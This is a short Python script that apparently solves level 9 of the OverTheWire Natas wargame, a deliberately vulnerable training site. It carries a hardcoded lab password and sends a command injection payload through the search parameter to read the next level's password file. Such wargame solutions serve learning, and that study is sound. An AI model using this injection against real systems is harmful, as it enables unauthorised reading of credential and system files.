#!/usr/bin/env python

import requests
import re
print("Natas Level 9")

username = "natas9"
password = "W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl"

data = { "needle":"| cat /etc/natas_webpass/natas10","submit":"Search"}

url = "http://%s.natas.labs.overthewire.org/?needle=%s&submit=Search"%(username,"| cat /etc/natas_webpass/natas10")

with requests.session() as session:
	response = session.get(url , auth = (username, password) )

	content = response.text 

	# print( content)

	print( re.findall("<pre>\n(.*)\n\nAfrican", content)[0] )

